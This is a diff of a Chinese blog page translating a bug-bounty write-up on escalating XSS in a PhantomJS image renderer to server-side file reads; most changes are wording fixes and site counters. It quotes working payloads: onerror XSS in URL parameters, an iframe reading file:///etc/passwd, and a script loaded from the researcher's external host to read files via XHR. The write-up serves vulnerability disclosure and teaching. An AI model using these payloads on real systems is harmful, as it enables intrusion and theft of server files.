@@ -106,7 +106,7 @@
 <meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/local-file-1.png">
 <meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/response.png">
 <meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/passwds.png">
-<meta property="og:updated_time" content="2017-07-01T17:15:15.000Z">
+<meta property="og:updated_time" content="2017-07-06T06:42:46.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF&#x2F;LFR">
 <meta name="twitter:description" content="在一次赏金程序中，我碰见这么一个请求，用户输入然后生成图片供下载。过了一会儿，我便把图片内部的XSS升级成服务端的任意文件读取漏洞。因为程序的隐私性，所以我将尽力抹掉敏感信息。">
@@ -417,7 +417,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write('test')" /&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
 <p>响应:</p>
 <p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/test-1.png" alt="test-1"></p>
-<p>这时，只要页面加载，存储型JavaScript就能执行。接下来我需要收集更多关于PhantomJS和代码执行上下文环境的信息。</p>
+<p>此时，对于每次的页面加载，我都能获得一致JavaScript执行结果。接下来我需要收集更多关于PhantomJS和代码执行上下文环境的信息。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write(window.location)" /&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
 <p>响应：</p>
 <p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/var-location-1.png" alt="var-location-1"></p>
@@ -427,7 +427,7 @@
 <p>现在可以得出结论了，至少<code>/var/task</code>下的任意文件可以被读取，接下来我想看看能否读取其他目录下的文件（比如<code>/etc/</code>目录）</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')"/&gt;</div></pre></td></tr></table></figure>
 <p>很尴尬，请求没有返回。</p>
-<p>于是我对<code>/var/tasks</code>目录进行了搜索以便获取更多信息，最后发现这可能和<a href="https://en.wikipedia.org/wiki/AWS_Lambda" target="_blank" rel="external">AWS Lambda</a>有关。这个发现让我将注意力放在了同目录下的某些文件上（比如<code>/var/task/index.js</code>），这些文件应该包含了Phantom插件的源码。所以我认为在<code>/var/</code>下我能访问的文件内容可能会提供更多信息，至少会有一些值得报告的信息。</p>
+<p>于是我对<code>/var/tasks</code>进行了google搜索以便获取更多信息，最后发现这可能和<a href="https://en.wikipedia.org/wiki/AWS_Lambda" target="_blank" rel="external">AWS Lambda</a>有关。这个发现让我将注意力放在了同目录下的某些文件上（比如<code>/var/task/index.js</code>），这些文件应该包含了Phantom插件的源码。所以我认为在<code>/var/</code>下我能访问的文件内容可能会提供更多信息，至少会有一些值得报告的信息。</p>
 <p>理论上使用XHR和Ajax应该能够读取文件内容并在图片中展示或者将内容提取到我的服务器上。但直接通过<code>document.write</code>写入js代码发生了问题，最终我发现可以通过外部脚本来绕过这个问题。</p>
 <p>Payload:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;script src="https://xss.buer.haus/test.js"&gt;&lt;/script&gt;')"/&gt;</div></pre></td></tr></table></figure>
@@ -437,7 +437,7 @@
 <p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/response.png" alt="response"></p>
 <p>现在在<code>file://</code>环境下，可以通过带外JavaScript和XHR来读取任意文件来。所以我用脚本再次读取<code>/etc/passwd</code>去检测<code>iframe</code>是否生效。</p>
 <p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/passwds.png" alt="response"></p>
-<p>啊哈哈！当PhantomJS由于某种原因加载<code>&lt;iframe src=&quot;file://&quot;&gt;</code>时，XHR完全可以访问<code>file://</code>的上下文环境（也就是访问任意文件）。</p>
+<p>啊哈哈！虽然PhantomJS由于某种原因无法加载<code>&lt;iframe src=&quot;file://&quot;&gt;</code>，但XHR却可以完全可以访问<code>file://</code>的上下文环境（也就是访问任意文件）。</p>
 <p>在经历这些后，会发现XSS在最初似乎一点价值都没，但是从XSS到LFI却费了很多力气。这是一次非常奇怪的赏金之旅，感觉就像在CTF中找flag而不是试图利用生产服务器。这次我最大的收获是投入到这场伪CTF挑战赛的那些周末实际上都是值得的。</p>
 <p>[Source][<a href="http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="external">http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</a>]</p>
 
@@ -563,7 +563,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -574,7 +574,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">7</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
